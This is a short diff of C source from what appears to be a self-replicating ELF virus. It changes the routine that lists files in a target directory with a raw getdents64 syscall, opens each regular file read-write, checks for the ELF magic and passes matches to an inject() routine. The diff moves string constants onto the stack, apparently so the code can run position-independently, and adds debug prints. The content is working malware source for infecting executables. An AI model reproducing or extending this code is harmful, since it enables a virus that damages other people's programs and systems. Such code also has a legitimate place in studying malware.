@@ -5,20 +5,23 @@
 int FORCE_INLINE is_good_format(char *filename)
 {
 	char	buf[BUF_SIZE];
+	char	infested_dir[] = INFESTED_DIR;
+	char	elfmag[] = ELFMAG;
 	int	fd;
 	size_t	name_size;
 
+
 	name_size = ft_strlen(filename);
-	if (name_size + sizeof(INFESTED_DIR) > BUF_SIZE)
+	if (name_size + sizeof(infested_dir) > BUF_SIZE)
 		return (-1);
-	ft_memcpy(buf, INFESTED_DIR, sizeof(INFESTED_DIR) - 1);
-	ft_memcpy(buf + sizeof(INFESTED_DIR) - 1, filename, name_size);
-	buf[name_size + sizeof(INFESTED_DIR) - 1] = 0;
+	ft_memcpy(buf, infested_dir, sizeof(infested_dir) - 1);
+	ft_memcpy(buf + sizeof(infested_dir) - 1, filename, name_size);
+	buf[name_size + sizeof(infested_dir) - 1] = 0;
 	fd = OPEN(buf, O_RDWR);
 	if (fd < 0)
 		return (-1);
-	READ(fd, buf, sizeof(ELFMAG) - 1);
-	if (ft_memcmp(buf, ELFMAG, sizeof(ELFMAG) - 1))
+	READ(fd, buf, sizeof(elfmag) - 1);
+	if (ft_memcmp(buf, elfmag, sizeof(elfmag) - 1))
 	{
 		CLOSE(fd);
 		return (-1);
@@ -38,16 +41,22 @@ int finder(t_data data, int dir_fd)
 	ft_putchar('\n');
 	while(1)
 	{
-//		ft_putchar('2');
-//		ft_putchar('l');
-//		ft_putchar('\n');
+		ft_putchar('2');
+		ft_putchar('l');
+		ft_putchar('\n');
 		nread = syscall3(SYS_GETDENT64, (u64)dir_fd, (u64)buf, (u64)BUF_SIZE);
 		if (!nread || nread == -1)
 			return (0);
 		bpos = 0;
 		while (bpos < nread)
 		{
+		ft_putchar('2');
+		ft_putchar('r');
+		ft_putchar('\n');
 			d = (struct linux_dirent64*)(buf + bpos);
+		ft_putchar('2');
+		ft_putchar('o');
+		ft_putchar('\n');
 			if (d->d_type == DT_REG && (data.fd = is_good_format(d->d_name)) != -1)
 				inject(data);
 			bpos += d->d_reclen;
